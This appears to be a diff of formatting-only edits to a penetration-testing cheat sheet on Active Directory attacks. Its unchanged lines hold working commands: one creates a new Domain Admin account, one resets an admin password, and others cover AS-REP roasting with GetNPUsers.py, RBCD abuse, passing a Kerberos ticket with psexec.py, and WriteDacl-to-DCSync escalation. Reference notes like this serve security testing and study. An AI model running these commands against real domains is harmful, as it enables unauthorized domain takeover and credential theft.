@@ -193,10 +193,12 @@ Use crackmapexec to find RDP credentials:
     - can reset passwords
 
 Create a new Domain Admin:
+
     net user pentester P4ssw0rd! /add /domain
     net group "Domain Admins" pentester /add /domain
 
 Reset password of existing domain admin:
+
     net user admin NewPass123! /domain
 
 
@@ -239,7 +241,7 @@ user enumeration:
 ## AS-REP roasting
 In Kerberos `Pre-authentication` is an important securtiy feature to prevent replay attacks and password brute force. However for some accounts pre-authentication may be disabled. This weakness can be exploited with as-rep roasting. Kerberos sends a response including encrypted information that can be used for offline cracking. If pre-authentication is enabled Kerberos sends a chellange to the user which has to be send back encrypted using the users password. This step is skipped when pre-authentication is disabled.
 
-GetNPusers.py can be used to request such a response for a such a user:
+`GetNPusers.py` can be used to request such a response for a such a user:
 
     GetNPUsers.py domain.tld/username -dc-ip [DC_IP] -no-pass
 
@@ -283,7 +285,7 @@ Check for accounts that have `TRUSTED_FOR_DELEGATION` enabled:
     Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
 
 #### GenericAll
-GenericAll privilege can be abused for resource based constraint delegation attack (RBCD).
+GenericAll privilege can be abused for `resource based constraint delegation attack (RBCD)`.
 Through RBCD an attacker can add a computer under his control to the domain.
 
 Check if the value of `ms-ds-machineaccountquota` is higher than zero in order to add an account:
@@ -355,7 +357,7 @@ Now connect as `Administrator` to the domain by passing the hash:
     KRB5CCNAME=ticket.ccache psexec.py <DOMAIN>/administrator@<DOMAIN> -k -no-pass
 
 #### WriteDacl
-WriteDacl privileges gives a user the ability to add ACLs to an object. This means that an attacker can add a user to this group and give them DCSync privileges. `DCSync` privilages give a user the ability to act as a domain admin.
+`WriteDacl` privileges gives a user the ability to add ACLs to an object. This means that an attacker can add a user to this group and give them DCSync privileges. `DCSync` privilages give a user the ability to act as a domain admin.
 
 Upload PowerView:
 
